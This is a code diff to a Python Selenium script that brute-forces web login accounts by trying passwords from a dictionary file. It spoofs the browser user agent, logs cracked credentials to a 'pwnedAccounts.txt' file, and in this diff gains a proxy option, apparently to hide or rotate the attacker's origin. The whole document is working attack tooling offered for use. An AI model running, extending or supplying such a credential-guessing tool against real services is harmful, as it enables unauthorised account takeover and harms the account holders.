@@ -6,6 +6,7 @@ from selenium.webdriver.common.keys import Keys
 import simplejson as json
 import sys
 import optparse
+import yaml
 
 profile = webdriver.FirefoxProfile()
 profile.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36")
@@ -20,7 +21,7 @@ def userExists(username):
 		return 1
 	except:
 		'uknown error'
-		
+
 def login(user, password, delay):
 	try:
 		print 'Trying with password: ' + password
@@ -29,7 +30,7 @@ def login(user, password, delay):
 		elem.send_keys(user)
 		elem = driver.find_element_by_name("password")
 		elem.clear()
-		elem.send_keys(password)  
+		elem.send_keys(password)
 		elem.send_keys(Keys.RETURN)
 		sleep(delay)
 		assert (("Login") in driver.title)
@@ -40,7 +41,7 @@ def login(user, password, delay):
 		#else:
 		#	print 'Wrong password'
 	except AssertionError:
-		print 'Access granted mother kaker!!' 
+		print 'Access granted mother kaker!!'
 		print 'The password is: ' + password
 		try:
 			f = open('pwnedAccounts.txt','a')
@@ -80,6 +81,7 @@ def main():
 	parser.add_option('-d', '--dictionary', action="store", dest="dictionary", help="File containing passwords", default=False)
 	parser.add_option('-u', '--username', action="store", dest="username", help="A valid username", default=False)
 	parser.add_option('-t', '--time', action="store", dest="delay", help="delay in seconds. Use this option based on your connection speed", default=True)
+        parser.add_option('-p', '--proxy', action='store_true', default=False)
 	options, args = parser.parse_args()
 
 	global driver
@@ -88,7 +90,7 @@ def main():
 		delay = 2
 	else:
 		delay = int(options.delay)
-	print 'Using %d seconds of delay' %delay 
+	print 'Using %d seconds of delay' %delay
 
 	if ( (options.userfile == False) and (options.username == False) ) :
 		print 'You have to set an username or a userfile'
@@ -99,11 +101,19 @@ def main():
 	if (options.dictionary == False):
 		print 'You have to set a valid path for the passwords dictionary'
 		exit()
+        if options.proxy:
+            with open('proxy.yaml', 'r') as f:
+                # TODO For now it just takes the first proxy config
+                config = yaml.load(f).values()[0]
+                for k, v in config.iteritems():
+                    getattr(profile, 'set_preference')(k,v)
+                profile.update_preferences()
+
 
 	try:
 		f = open(options.dictionary,'r')
 		passwords = []
-		
+
 		while True:
 			line = f.readline()
 			if not line:
@@ -113,12 +123,12 @@ def main():
 	except:
 		print 'Check the path to the dictionary and try again'
 		exit()
-	
+
 	if (options.userfile != False):
 		try:
 			f = open(options.userfile,'r')
 			usernames = []
-			
+
 			while True:
 				line = f.readline()
 				if not line:
@@ -128,7 +138,7 @@ def main():
 		except:
 			print 'Check the path to the users file and try again'
 			exit()
-        	
+
         	driver = webdriver.Firefox(profile)
         	driver.implicitly_wait(30)
 		dictionaryAttack(usernames,passwords,delay)
@@ -136,7 +146,7 @@ def main():
        		driver = webdriver.Firefox(profile)
 	        driver.implicitly_wait(30)
 		dictionaryAttack(options.username,passwords,delay)
-	
+
 	driver.close()
 if __name__ == '__main__':
 	main()
